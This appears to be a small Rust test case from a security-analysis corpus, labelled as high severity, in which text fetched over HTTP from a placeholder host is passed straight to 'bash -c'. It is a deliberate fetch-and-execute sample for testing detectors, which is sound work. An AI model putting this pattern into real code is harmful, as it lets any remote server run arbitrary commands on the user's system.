// CEDE corpus: high/network_2_sink_2 — network-derived data reaches a command (illustrative reqwest dependency)
use std::process::Command;
fn main() {
    let input=reqwest::blocking::get("https://example.test/api").unwrap().text().unwrap();
Command::new("bash").args(["-c", &input]).output().unwrap();
}
